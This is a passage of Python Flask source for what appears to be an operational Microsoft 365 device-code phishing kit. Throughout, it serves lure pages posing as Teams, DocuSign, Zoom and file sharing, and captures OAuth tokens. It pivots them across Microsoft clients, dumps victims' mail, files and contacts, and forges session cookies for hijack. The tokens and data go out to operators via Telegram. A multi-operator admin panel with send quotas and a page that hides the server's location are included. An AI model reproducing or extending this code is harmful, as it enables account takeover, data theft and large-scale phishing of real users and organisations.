            {"domain": ".login.microsoftonline.com", "expirationDate": 9999999999, "hostOnly": False, "httpOnly": True, "name": "ESTSAUTH", "path": "/", "sameSite": "no_restriction", "secure": True, "session": False, "storeId": "0", "value": estsauth},
            {"domain": ".login.microsoftonline.com", "expirationDate": 9999999999, "hostOnly": False, "httpOnly": True, "name": "ESTSAUTHPERSISTENT", "path": "/", "sameSite": "no_restriction", "secure": True, "session": False, "storeId": "0", "value": estsauth},
        ]

    return result


def detect_roles(access_token):
    """Detect admin roles from Graph API."""
    headers = {"Authorization": f"Bearer {access_token}"}
    roles = []
    ADMIN_ROLE_MAP = {
        "62e90394-69f5-4237-9190-012177145e10": "🔴 Global Administrator",
        "194ae4cb-b126-40b2-bd5b-6091b380977d": "🟠 Security Administrator",
        "29232cdf-9323-42fd-ade2-1d097af3e4de": "🟡 Exchange Administrator",
        "f28a1f50-f6e7-4571-818b-6a12f2af6b6c": "🟢 SharePoint Administrator",
        "fe930be7-5e62-47db-91af-98c3a49a38b1": "🔵 User Administrator",
        "e8611ab8-c189-46e8-94e1-60213ab1f814": "🟣 Privileged Role Administrator",
        "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3": "⚫ Application Administrator",
        "3a2c62db-5318-420d-8d74-23affee5d9d5": "📱 Intune Administrator",
        "69091246-20e8-4a56-aa4d-066075b2a7a8": "💬 Teams Administrator",
    }
    try:
        r = requests.get(
            "https://graph.microsoft.com/v1.0/me/memberOf?$select=displayName,roleTemplateId,@odata.type",
            headers=headers, timeout=15,
        )
        if r.status_code == 200:
            for m in r.json().get("value", []):
                if "directoryRole" in m.get("@odata.type", ""):
                    rtid = m.get("roleTemplateId", "")
                    roles.append(ADMIN_ROLE_MAP.get(rtid, m.get("displayName", rtid)))
    except Exception:
        pass
    return roles


# ─── Device Code Logic ───────────────────────────────────────────────
def generate_device_code():
    body = {"client_id": CLIENT_ID, "resource": RESOURCE}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    try:
        r = requests.post(
            "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0",
            data=body, headers=headers, timeout=15,
        )
        data = r.json()
        return {
            "user_code": data.get("user_code", ""),
            "device_code": data.get("device_code", ""),
            "interval": int(data.get("interval", 5)),
            "expires_in": int(data.get("expires_in", 900)),
        }
    except Exception as e:
        log.error(f"Device code generation failed: {e}")
        return None


# ─── Auto-Pivot (FOCI) ──────────────────────────────────────────────
def foci_pivot(refresh_token):
    """Pivot refresh token to all FOCI-compatible services."""
    pivoted = {}
    for name, target in FOCI_TARGETS.items():
        try:
            r = requests.post(
                "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0",
                data={
                    "client_id": target["client_id"],
                    "grant_type": "refresh_token",
                    "refresh_token": refresh_token,
                    "resource": target["resource"],
                },
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                timeout=15,
            )
            if r.status_code == 200 and "access_token" in r.json():
                pivoted[name] = {
                    "access_token": r.json()["access_token"],
                    "refresh_token": r.json().get("refresh_token", refresh_token),
                }
                log.info(f"  🔄 FOCI pivot to {name}: ✓")
            else:
                log.info(f"  🔄 FOCI pivot to {name}: ✗")
        except Exception:
            log.info(f"  🔄 FOCI pivot to {name}: ✗ (error)")
    return pivoted


# ─── Auto-Intel Dump ─────────────────────────────────────────────────
def dump_intel(access_token, upn, user_code):
    """Auto-dump profile, emails, files, org, calendar from captured token."""
    headers = {"Authorization": f"Bearer {access_token}"}
    intel = {"user_code": user_code, "upn": upn, "dumped_at": now_utc().isoformat()}

    endpoints = {
        "profile": "/me?$select=displayName,mail,userPrincipalName,mobilePhone,jobTitle,officeLocation,department",
        "emails": "/me/messages?$top=100&$select=subject,from,receivedDateTime,isRead,bodyPreview",
        "files": "/me/drive/root/children?$top=50&$select=name,size,lastModifiedDateTime,webUrl",
        "contacts": "/me/contacts?$top=100&$select=displayName,emailAddresses,mobilePhone,companyName",
        "calendar": "/me/calendar/events?$top=50&$select=subject,start,end,location,organizer",
        "org": "/organization?$select=displayName,verifiedDomains",
    }

    for name, endpoint in endpoints.items():
        try:
            r = requests.get(
                f"https://graph.microsoft.com/v1.0{endpoint}",
                headers=headers, timeout=15,
            )
            if r.status_code == 200:
                data = r.json()
                intel[name] = data.get("value", data) if "value" in data else data
                count = len(data.get("value", [])) if "value" in data else 1
                log.info(f"  📥 Intel dump {name}: {count} items")
            else:
                intel[name] = {"error": r.status_code}
                log.info(f"  📥 Intel dump {name}: {r.status_code}")
        except Exception as e:
            intel[name] = {"error": str(e)}
    
    # Save intel
    safe_upn = re.sub(r'[^a-zA-Z0-9@._-]', '_', upn)
    intel_file = os.path.join(INTEL_DIR, f"{safe_upn}_intel.json")
    with open(intel_file, "w") as f:
        json.dump(intel, f, indent=2)
    log.info(f"  📂 Intel saved to {intel_file}")
    return intel


# ─── OWA tokenLogin Globals ─────────────────────────────────────────
# In-memory cache: { token_index: { "url": "...", "upn": "...", "generated_at": datetime, "expires_in": int } }
owa_url_cache = {}
owa_cache_lock = threading.Lock()
OWA_CACHE_TTL = 2700  # 45 minutes — refresh before the ~1 hour token expiry


def _generate_owa_url(refresh_token):
    """Exchange a refresh token for an Outlook access token and build the tokenLogin URL.
    Uses outlook.office365.com resource for direct OWA session, with substrate fallback."""
    ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}

    # Try each resource in order — first one that works wins
    resources = [
        ("https://outlook.office365.com/", "https://outlook.office365.com/owa/tokenLogin?token={token}&redirectTo=https%3A%2F%2Foutlook.office365.com%2Fowa%2F%3Fexsvurl%3D1%26ll-cc%3D1033%26modurl%3D0"),
        ("https://outlook.office.com/",    "https://outlook.office.com/owa/tokenLogin?token={token}&redirectTo=https%3A%2F%2Foutlook.office.com%2Fmail%2F"),
        ("https://substrate.office.com/",  "https://outlook.office365.com/owa/tokenLogin?token={token}&redirectTo=https%3A%2F%2Foutlook.office365.com%2Fowa%2F"),
    ]

    for resource, url_template in resources:
        try:
            r = requests.post(
                "https://login.microsoftonline.com/Common/oauth2/token",
                data={
                    "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
                    "grant_type": "refresh_token",
                    "refresh_token": refresh_token,
                    "resource": resource,
                },
                headers=ua, timeout=15,
            )
            if r.status_code == 200 and "access_token" in r.json():
                at = r.json()["access_token"]
                owa_url = url_template.replace("{token}", at)
                log.info(f"📬 OWA token obtained via resource: {resource}")
                return owa_url, int(r.json().get("expires_in", 3600)), r.json().get("refresh_token", refresh_token)
        except Exception as e:
            log.warning(f"OWA token exchange failed for {resource}: {e}")
            continue

    return None, 0, refresh_token


# ─── Token Auto-Refresh ─────────────────────────────────────────────
def auto_refresh_loop():
    """Background thread: refresh all captured tokens every 45 minutes."""
    while True:
        time.sleep(2700)  # 45 minutes
        if not os.path.exists(TOKEN_LOG):
            continue
        try:
            with open(TOKEN_LOG) as f:
                tokens = json.load(f)
            
            refreshed = 0
            for t in tokens:
                rt = t.get("refresh_token", "")
                if not rt:
                    continue
                try:
                    r = requests.post(
                        "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0",
                        data={
                            "client_id": CLIENT_ID,
                            "grant_type": "refresh_token",
                            "refresh_token": rt,
                            "resource": RESOURCE,
                        },
                        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
                        timeout=15,
                    )
                    if r.status_code == 200 and "access_token" in r.json():
                        t["access_token"] = r.json()["access_token"]
                        t["refresh_token"] = r.json().get("refresh_token", rt)
                        t["last_refreshed"] = now_utc().isoformat()
                        refreshed += 1
                except Exception:
                    pass

            if refreshed > 0:
                _safe_save_tokens(tokens)
                log.info(f"🔄 Auto-refreshed {refreshed} token(s)")

            # Pre-generate OWA tokenLogin URLs for instant access
            owa_refreshed = 0
            for i, t in enumerate(reversed(tokens)):
                rt = t.get("refresh_token", "")
                if not rt:
                    continue
                try:
                    owa_url, expires_in, _ = _generate_owa_url(rt)
                    if owa_url:
                        with owa_cache_lock:
                            owa_url_cache[i] = {
                                "url": owa_url,
                                "upn": t.get("upn", "unknown"),
                                "generated_at": now_utc(),
                                "expires_in": expires_in,
                            }
                        owa_refreshed += 1
                except Exception:
                    pass
            if owa_refreshed > 0:
                log.info(f"📬 Pre-generated {owa_refreshed} OWA tokenLogin URL(s)")

        except Exception as e:
            log.warning(f"Auto-refresh error: {e}")


# ─── Token Polling ───────────────────────────────────────────────────
def poll_for_token(device_code, user_code, interval, expires_in, operator_id="admin"):
    body = {
        "client_id": CLIENT_ID,
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "code": device_code,
    }
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

    elapsed = 0
    log.info(f"⏳ Polling for code {user_code} (expires in {expires_in}s)")

    while elapsed < expires_in:
        time.sleep(interval)
        elapsed += interval

        try:
            r = requests.post(
                "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0",
                data=body, headers=headers, timeout=15,
            )
            response = r.json()

            if "access_token" in response:
                log.info(f"🎯 TOKEN CAPTURED for code {user_code}")

                claims = decode_jwt(response["access_token"])
                upn = claims.get("upn", "unknown")
                tid = claims.get("tid", "unknown")
                name = claims.get("name", "unknown")
                scp = claims.get("scp", "")

                log.info(f"  👤 User:   {upn}")
                log.info(f"  🏢 Tenant: {tid}")
                log.info(f"  📛 Name:   {name}")

                # Update session status
                with sessions_lock:
                    if user_code in sessions:
                        sessions[user_code]["status"] = "captured"
                        sessions[user_code]["upn"] = upn
                        sessions[user_code]["name"] = name
                        sessions[user_code]["tenant"] = tid
                        sessions[user_code]["captured_at"] = now_utc().isoformat()

                # Auto-pivot via FOCI
                log.info("  🔄 Starting FOCI pivot...")
                pivoted = foci_pivot(response.get("refresh_token", ""))

                # Auto intel dump
                log.info("  📥 Starting intel dump...")
                intel = dump_intel(response["access_token"], upn, user_code)

                # Build email summary for Telegram
                email_summary = ""
                if isinstance(intel.get("emails"), list):
                    for e in intel["emails"][:5]:
                        subj = e.get("subject", "(no subject)")[:50]
                        frm = e.get("from", {}).get("emailAddress", {}).get("address", "?")
                        email_summary += f"  • `{subj}` — {frm}\n"

                # Save token
                token_data = {
                    "user_code": user_code,
                    "upn": upn,
                    "name": name,
                    "tenant_id": tid,
                    "scopes": scp,
                    "access_token": response["access_token"],
                    "refresh_token": response.get("refresh_token", ""),
                    "pivoted_tokens": pivoted,
                    "captured_at": now_utc().isoformat(),
                    "last_refreshed": now_utc().isoformat(),
                    "pretext": sessions.get(user_code, {}).get("pretext", "share"),
                    "source_ip": sessions.get(user_code, {}).get("ip", ""),
                    "operator_id": operator_id,
                }

                tokens = _safe_load_tokens()
                tokens.append(token_data)
                _safe_save_tokens(tokens)
                log.info(f"💾 Token saved safely ({len(tokens)} total)")

                # Push live capture — scoped so operators only see their own
                _sse_broadcast("capture", {
                    "upn": upn,
                    "name": name,
                    "tenant_id": tid,
                    "operator_id": operator_id,
                    "captured_at": token_data["captured_at"],
                    "idx": len(tokens) - 1,
                }, operator_id=operator_id)

                # === Post-save operations (wrapped separately so failures don't cause duplicate saves) ===
                try:
                    # Detect admin roles
                    log.info("  👑 Checking directory roles...")
                    roles = detect_roles(response["access_token"])

                    # Generate session cookies for browser hijack
                    log.info("  🍪 Generating session cookies...")
                    rt = response.get("refresh_token", "")
                    cookies = generate_session_cookies(rt) if rt else {}

                    # Telegram Alert 1: Token Capture Summary
                    pivot_summary = ", ".join([f"✓ {k}" for k in pivoted.keys()]) or "none"
                    role_summary = "\n".join([f"  {r}" for r in roles]) if roles else "  Standard User"
                    msg = (
                        f"🎯 *TOKEN CAPTURED*\n\n"
                        f"👤 *User:* `{upn}`\n"
                        f"📛 *Name:* `{name}`\n"
                        f"🏢 *Tenant:* `{tid}`\n"
                        f"🔑 *Code:* `{user_code}`\n"
                        f"⏰ *Time:* `{now_utc().strftime('%H:%M:%S UTC')}`\n\n"
                        f"👑 *Roles:*\n{role_summary}\n\n"
                        f"🔄 *FOCI Pivots:* {pivot_summary}\n\n"
                    )
                    if email_summary:
                        msg += f"📧 *Latest Emails:*\n{email_summary}\n"
                    msg += f"📂 Intel saved to `{upn}_intel.json`"
                    send_telegram_alert(msg)

                    # Telegram Alert 2: Cookie Editor JSON (as file)
                    if cookies.get("cookie_editor_import"):
                        cookie_json = json.dumps(cookies["cookie_editor_import"], indent=2)
                        send_telegram_document(
                            cookie_json,
                            f"{upn.split('@')[0]}_cookies.json",
                            f"🍪 *Cookie Editor Import* — `{upn}`\n\n1. Go to login.microsoftonline.com\n2. Open Cookie Editor → Import\n3. Paste this file contents\n4. Refresh page"
                        )

                    # Telegram Alert 3: OWA Direct Access URL
                    owa_url = ""
                    if rt:
                        try:
                            sub_r = graph_session.post(
                                "https://login.microsoftonline.com/Common/oauth2/token",
                                data={
                                    "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
                                    "grant_type": "refresh_token",
                                    "refresh_token": rt,
                                    "resource": "https://substrate.office.com/",
                                },
                                timeout=15,
                            )
                            if sub_r.status_code == 200 and "access_token" in sub_r.json():
                                sub_at = sub_r.json()["access_token"]
                                owa_url = f"https://outlook.office365.com/owa/tokenLogin?token={sub_at}&redirectTo=https%3A%2F%2Foutlook.office365.com%2Fmail%2F"
                                send_telegram_alert(
                                    f"📬 *MAILBOX ACCESS* — `{upn}`\n\n"
                                    f"Copy this URL and paste in browser:\n\n`{owa_url[:200]}...`\n\n"
                                    f"⚠️ URL expires in ~1 hour. Use /admin/mailbox for persistent access."
                                )
                                log.info(f"  📬 OWA tokenLogin URL generated")
                        except Exception as e:
                            log.warning(f"  OWA URL generation failed: {e}")

                    # Telegram Alert 4: Bearer tokens (as file)
                    bearer_data = {
                        "upn": upn,
                        "access_token": response["access_token"],
                        "refresh_token": rt,
                        "tenant_id": tid,
                        "pivoted": {k: v.get("access_token", "")[:80] + "..." for k, v in pivoted.items()},
                    }
                    if owa_url:
                        bearer_data["owa_login_url"] = owa_url
                    send_telegram_document(
                        json.dumps(bearer_data, indent=2),
                        f"{upn.split('@')[0]}_tokens.json",
                        f"🔑 *Bearer Tokens* — `{upn}`"
                    )
                except Exception as post_err:
                    log.warning(f"  ⚠️ Post-capture operations error (token already saved): {post_err}")

                # ALWAYS return after capture — never continue polling
                return

            error = response.get("error", "")
            if error != "authorization_pending":
                log.warning(f"  Polling error for {user_code}: {error}")
                with sessions_lock:
                    if user_code in sessions:
                        sessions[user_code]["status"] = "expired"
                return

        except Exception as e:
            log.warning(f"  Poll error: {e}")

    log.info(f"⏰ Code {user_code} expired after {expires_in}s")
    with sessions_lock:
        if user_code in sessions:
            sessions[user_code]["status"] = "expired"


# ─── Landing Page Routes ─────────────────────────────────────────────
def serve_landing(pretext, template):
    """Generic handler for all pretext landing pages."""
    ua = request.headers.get("User-Agent", "")
    ip = request.remote_addr

    # Bot filtering
    if is_bot(ua):
        return "Not Found", 404

    # Rate limiting
    if not check_rate_limit(ip):
        return "Too Many Requests", 429

    code_data = generate_device_code()
    if not code_data:
        return "Service temporarily unavailable", 503

    user_code = code_data["user_code"]
    log.info(f"🔗 New visitor → code: {user_code} | pretext: {pretext} | IP: {ip}")

    # Operator tracking from redirector
    operator_id = request.args.get("op", "admin")

    # Track session
    with sessions_lock:
        sessions[user_code] = {
            "status": "active",
            "pretext": pretext,
            "ip": ip,
            "operator_id": operator_id,
            "user_agent": ua[:100],
            "created_at": now_utc().isoformat(),
            "expires_at": (now_utc().replace(second=0) ).isoformat(),
            "_created_ts": time.time(),
        }

    # Start background polling
    t = threading.Thread(
        target=poll_for_token,
        args=(code_data["device_code"], user_code, code_data["interval"], code_data["expires_in"], operator_id),
        daemon=True,
    )
    t.start()

    # Geo-personalization from redirector
    geo_city = request.args.get("city", "")
    geo_country = request.args.get("country", "")
    geo_region = request.args.get("region", "")
    geo_flag = request.args.get("flag", "")

    return render_template(template, user_code=user_code,
                           turnstile_enabled=TURNSTILE_ENABLED,
                           turnstile_site_key=TURNSTILE_SITE_KEY,
                           geo_city=geo_city,
                           geo_country=geo_country,
                           geo_region=geo_region,
                           geo_flag=geo_flag)


@app.route("/share")
def share_page():
    return serve_landing("share", "share.html")

@app.route("/teams")
def teams_page():
    return serve_landing("teams", "teams.html")

@app.route("/secure")
def secure_page():
    return serve_landing("secure", "secure.html")

@app.route("/docusign")
def docusign_page():
    return serve_landing("docusign", "docusign.html")

@app.route("/zoom")
def zoom_page():
    return serve_landing("zoom", "zoom.html")

# ─── Microsoft Login Proxy (Geo-Swap) ────────────────────────────────
# Proxies the Microsoft devicelogin page and replaces the VPS location
# with the visitor's actual location. Prevents "located in United States"
# from exposing the VPS location.

import re as _re
from urllib.parse import urljoin

MS_LOGIN_BASE = "https://login.microsoftonline.com"
MS_DEVICE_LOGIN = "https://microsoft.com/devicelogin"

@app.route("/auth/devicelogin")
def proxy_device_login():
    """Show a geo-personalized transition page before redirecting to Microsoft."""
    geo_city = request.args.get("city", "")
    geo_country = request.args.get("country", "")
    geo_flag = request.args.get("flag", "")
    loc = ""
    if geo_city and geo_country:
        loc = f"{geo_city}, {geo_country}"
    elif geo_country:
        loc = geo_country
    elif geo_city:
        loc = geo_city
    loc_html = f' located in <strong>{loc}</strong>' if loc else ''
    badge_html = f'<div style="display:inline-flex;align-items:center;gap:6px;padding:8px 16px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:6px;font-size:14px;color:#15803d;margin-bottom:24px">{geo_flag} {loc}</div><br>' if loc else ''
    page = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Redirecting to Microsoft...</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Segoe UI',system-ui,sans-serif;background:#f2f2f2;display:flex;align-items:center;justify-content:center;min-height:100vh}}
.c{{background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,.1);padding:44px;max-width:440px;width:100%;text-align:center}}
.c img{{width:108px;margin-bottom:20px}}
h1{{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:12px}}
.s{{font-size:15px;color:#1b1b1b;margin-bottom:20px;line-height:1.5}}
.sp{{width:24px;height:24px;border:3px solid #e5e7eb;border-top-color:#0078d4;border-radius:50%;animation:r .8s linear infinite;margin:0 auto 16px}}
@keyframes r{{to{{transform:rotate(360deg)}}}}
.h{{font-size:13px;color:#616161}}
</style></head><body><div class="c">
<img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
<h1>Verifying your identity</h1>
<p class="s">You're signing in to <strong>Microsoft Office</strong> on another device{loc_html}.</p>
{badge_html}<div class="sp"></div>
<p class="h">Redirecting to Microsoft sign-in...</p>
</div><script>setTimeout(function(){{window.location.href="https://microsoft.com/devicelogin"}},2500)</script>
</body></html>"""
    return page



# ─── Admin Login ─────────────────────────────────────────────────────
@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    """Password gate for admin dashboard with brute-force lockout."""
    error = ""
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()

    # ── Brute-force lockout check ──
    if client_ip in login_attempts:
        record = login_attempts[client_ip]
        if record.get("locked_until", 0) > time.time():
            remaining = int(record["locked_until"] - time.time())
            error = f"Too many failed attempts. Try again in {remaining // 60}m {remaining % 60}s"
            log.warning(f"🔒 Locked out IP tried login: {client_ip} ({remaining}s remaining)")
            # Still render the page with error but don't process POST
            return _render_login_page(error)

    if request.method == "POST":
        pw = request.form.get("password", "")
        username = request.form.get("username", "").strip().lower()
        totp_code = request.form.get("totp_code", "").strip()

        # Check admin login (empty username or "admin")
        if (not username or username == "admin") and pw == ADMIN_PASSWORD:
            # TOTP check — only enforced if 2FA is configured
            if not _totp_verify(totp_code):
                error = "Invalid 2FA code."
                return _render_login_page(error)
            login_attempts.pop(client_ip, None)
            token = secrets.token_hex(32)
            admin_sessions[token] = {
                "expires": time.time() + (ADMIN_SESSION_HOURS * 3600),
                "role": "admin",
                "operator_id": "admin",
                "username": "admin",
            }
            log.info(f"🔑 Admin login from {client_ip}")
            resp = make_response(redirect("/admin"))
            resp.set_cookie("admin_token", token, httponly=True, secure=True, samesite="Lax",
                          max_age=ADMIN_SESSION_HOURS * 3600)
            # Audit the login directly (outside request context for the cookie)
            try:
                with _audit_lock:
                    with open(AUDIT_LOG_FILE, "a") as _af:
                        _af.write(json.dumps({"ts": now_utc().isoformat(), "operator_id": "admin",
                            "username": "admin", "role": "admin", "ip": client_ip,
                            "action": "login", "target": "", "detail": "admin login"}) + "\n")
            except Exception:
                pass
            return resp

        # Check operator login
        if username and username != "admin":
            operators = _load_operators()
            import hashlib as _hl
            pw_hash = _hl.sha256(pw.encode()).hexdigest()
            matched = next((op for op in operators if op["username"] == username and op["password_hash"] == pw_hash), None)
            if matched:
                login_attempts.pop(client_ip, None)
                token = secrets.token_hex(32)
                admin_sessions[token] = {
                    "expires": time.time() + (ADMIN_SESSION_HOURS * 3600),
                    "role": "operator",
                    "operator_id": matched["id"],
                    "username": matched["username"],
                }
                log.info(f"🔑 Operator login: {matched['username']} from {client_ip}")
                try:
                    with _audit_lock:
                        with open(AUDIT_LOG_FILE, "a") as _af:
                            _af.write(json.dumps({"ts": now_utc().isoformat(), "operator_id": matched["id"],
                                "username": matched["username"], "role": "operator", "ip": client_ip,
                                "action": "login", "target": "", "detail": "operator login"}) + "\n")
                except Exception:
                    pass
                resp = make_response(redirect("/admin"))
                resp.set_cookie("admin_token", token, httponly=True, secure=True, samesite="Lax",
                              max_age=ADMIN_SESSION_HOURS * 3600)
                return resp
        else:
            # ── Failed login: track attempts ──
            now = time.time()
            if client_ip not in login_attempts:
                login_attempts[client_ip] = {"attempts": 0, "timestamps": [], "locked_until": 0}
            record = login_attempts[client_ip]
            # Remove timestamps older than the lockout window
            record["timestamps"] = [t for t in record["timestamps"] if now - t < LOGIN_LOCKOUT_SECONDS]
            record["timestamps"].append(now)
            record["attempts"] = len(record["timestamps"])

            if record["attempts"] >= LOGIN_MAX_ATTEMPTS:
                record["locked_until"] = now + LOGIN_LOCKOUT_SECONDS
                error = f"Account locked for {LOGIN_LOCKOUT_SECONDS // 60} minutes due to too many failed attempts"
                log.warning(f"🔒 Admin lockout triggered: {client_ip} ({LOGIN_MAX_ATTEMPTS} failed attempts)")
                send_telegram_alert(
                    f"🔒 *Admin Lockout*\n\n"
                    f"IP: `{client_ip}`\n"
                    f"Attempts: {record['attempts']}\n"
                    f"Locked for: {LOGIN_LOCKOUT_SECONDS // 60} min\n"
                    f"Time: `{now_utc().strftime('%H:%M:%S UTC')}`"
                )
            else:
                remaining_attempts = LOGIN_MAX_ATTEMPTS - record["attempts"]
                error = f"Invalid password ({remaining_attempts} attempt{'s' if remaining_attempts != 1 else ''} remaining)"
                log.warning(f"🚫 Failed admin login from {client_ip} (attempt {record['attempts']}/{LOGIN_MAX_ATTEMPTS})")

    return _render_login_page(error)


def _render_login_page(error=""):
    """Render the login page HTML."""
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
    return render_template("login.html", error=error, client_ip=client_ip)


@app.route("/admin/logout")
def admin_logout():
    """Clear admin session."""
    token = request.cookies.get("admin_token", "")
    admin_sessions.pop(token, None)
    resp = make_response(redirect("/admin/login"))
    resp.delete_cookie("admin_token")
    return resp


@app.route("/admin/api/auth", methods=["POST"])
def api_auth():
    """JSON login for Electron/companion apps. Returns a session token."""
    data = request.get_json(silent=True) or {}
    pw = data.get("password", "")
    username = data.get("username", "").strip().lower()
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()

    # Admin login (empty username or "admin")
    if (not username or username == "admin") and pw == ADMIN_PASSWORD:
        token = secrets.token_hex(32)
        admin_sessions[token] = {
            "expires": time.time() + (ADMIN_SESSION_HOURS * 3600),
            "role": "admin",
            "operator_id": "admin",
            "username": "admin",
        }
        log.info(f"🔑 API auth login from {client_ip}")
        return jsonify({"token": token, "role": "admin", "username": "admin"})

    # Operator login
    if username:
        operators = _load_operators()
        import hashlib as _hl
        pw_hash = _hl.sha256(pw.encode()).hexdigest()
        matched = next((op for op in operators if op["username"] == username and op["password_hash"] == pw_hash), None)
        if matched:
            token = secrets.token_hex(32)
            admin_sessions[token] = {
                "expires": time.time() + (ADMIN_SESSION_HOURS * 3600),
                "role": "operator",
                "operator_id": matched["id"],
                "username": matched["username"],
            }
            log.info(f"🔑 API auth (operator): {matched['username']} from {client_ip}")
            return jsonify({"token": token, "role": "operator", "username": matched["username"]})

    log.warning(f"🚫 API auth failed from {client_ip}")
    return jsonify({"error": "Invalid credentials"}), 401

# ─── Operator Management ───────────────────────────────────────────
@app.route("/admin/api/operators/<op_id>/impersonate", methods=["POST"])
def api_impersonate_operator(op_id):
    """Admin logs in as an operator — returns a session token with operator role."""
    current = _get_current_operator()
    if current["role"] != "admin":
        return jsonify({"error": "forbidden"}), 403
    operators = _load_operators()
    matched = next((op for op in operators if op["id"] == op_id), None)
    if not matched:
        return jsonify({"error": "Operator not found"}), 404
    token = secrets.token_hex(32)
    admin_sessions[token] = {
        "expires": time.time() + (ADMIN_SESSION_HOURS * 3600),
        "role": "operator",
        "operator_id": matched["id"],
        "username": matched["username"],
    }
    log.info(f"👁️ Admin impersonating operator: {matched['username']}")
    return jsonify({"token": token, "username": matched["username"]})


@app.route("/admin/api/operators/<op_id>/login-as")
def api_login_as_operator(op_id):
    """Admin opens operator panel in new tab — sets cookie and redirects."""
    current = _get_current_operator()
    if current["role"] != "admin":
        return "Forbidden", 403
    operators = _load_operators()
    matched = next((op for op in operators if op["id"] == op_id), None)
    if not matched:
        return "Operator not found", 404
    token = secrets.token_hex(32)
    admin_sessions[token] = {
        "expires": time.time() + (ADMIN_SESSION_HOURS * 3600),
        "role": "operator",
        "operator_id": matched["id"],
        "username": matched["username"],
    }
    log.info(f"👁️ Admin opened operator panel: {matched['username']}")
    resp = make_response(redirect("/admin#overview"))
    resp.set_cookie("admin_token", token, httponly=True, secure=True, samesite="Lax",
                    max_age=ADMIN_SESSION_HOURS * 3600)
    return resp


@app.route("/admin/api/operators", methods=["GET"])
def api_list_operators():
    """List all operators (admin only)."""
    current = _get_current_operator()
    if current["role"] != "admin":
        return jsonify({"error": "forbidden"}), 403
    operators = _load_operators()
    # Don't return password hashes
    safe = [{
        "id": op["id"],
        "username": op["username"],
        "created_at": op.get("created_at", ""),
        "max_daily_sends": op.get("max_daily_sends", 0),
        "sends_today": op.get("sends_today", 0),
        "sends_today_date": op.get("sends_today_date", ""),
    } for op in operators]
    return jsonify({"operators": safe})

@app.route("/admin/api/operators", methods=["POST"])
def api_create_operator():
    """Create a new operator (admin only)."""
    current = _get_current_operator()
    if current["role"] != "admin":
        return jsonify({"error": "forbidden"}), 403
    data = request.get_json(silent=True) or {}
    username = data.get("username", "").strip().lower()
    password = data.get("password", "")
    if not username or not password:
        return jsonify({"error": "Username and password required"}), 400
    if username == "admin":
        return jsonify({"error": "Cannot use 'admin' as operator username"}), 400
    if len(username) < 3:
        return jsonify({"error": "Username must be at least 3 characters"}), 400
    if len(password) < 6:
        return jsonify({"error": "Password must be at least 6 characters"}), 400
    operators = _load_operators()
    if any(op["username"] == username for op in operators):
        return jsonify({"error": f"Operator '{username}' already exists"}), 409
    import hashlib as _hl
    max_daily = int(data.get("max_daily_sends", 0))  # 0 = unlimited
    new_op = {
        "id": f"op_{secrets.token_hex(6)}",
        "username": username,
        "password_hash": _hl.sha256(password.encode()).hexdigest(),
        "created_at": now_utc().isoformat(),
        "max_daily_sends": max_daily,
        "sends_today": 0,
        "sends_today_date": now_utc().strftime("%Y-%m-%d"),
    }
    operators.append(new_op)
    _save_operators(operators)
    log.info(f"👤 Operator created: {username} (id: {new_op['id']})")
    audit("operator_create", detail=f"created operator: {username}", target=new_op["id"])
    return jsonify({"id": new_op["id"], "username": username})

@app.route("/admin/api/operators/<op_id>/quota", methods=["POST"])
def api_operator_quota(op_id):
    """Set max_daily_sends for an operator (admin only)."""
    current = _get_current_operator()
    if current["role"] != "admin":
        return jsonify({"error": "forbidden"}), 403
    data = request.get_json(silent=True) or {}
    max_sends = int(data.get("max_daily_sends", 0))
    operators = _load_operators()
    op_rec = next((o for o in operators if o["id"] == op_id), None)
    if not op_rec:
        return jsonify({"error": "operator not found"}), 404
    op_rec["max_daily_sends"] = max_sends
    _save_operators(operators)
    audit("operator_quota_set", detail=f"max_daily_sends={max_sends}", target=op_id)
    return jsonify({"ok": True, "max_daily_sends": max_sends})

@app.route("/admin/api/operators/<op_id>", methods=["DELETE"])
def api_delete_operator(op_id):
    """Delete an operator (admin only)."""
    current = _get_current_operator()
    if current["role"] != "admin":
        return jsonify({"error": "forbidden"}), 403
    operators = _load_operators()
    removed = [op for op in operators if op["id"] == op_id]
    operators = [op for op in operators if op["id"] != op_id]
    _save_operators(operators)
    if removed:
        log.info(f"🗑️ Operator deleted: {removed[0]['username']}")
        audit("operator_delete", detail=f"deleted operator: {removed[0]['username']}", target=op_id)
    return jsonify({"ok": True})

@app.route("/admin/api/me/password", methods=["POST"])
def api_change_password():
    """Operator changes their own password."""
    current = _get_current_operator()
    data = request.get_json(silent=True) or {}
    old_pw = data.get("current_password", "")
    new_pw = data.get("new_password", "")

    if not old_pw or not new_pw:
        return jsonify({"error": "Current and new password required"}), 400
    if len(new_pw) < 6:
        return jsonify({"error": "New password must be at least 6 characters"}), 400

    import hashlib as _hl

    if current["role"] == "admin":
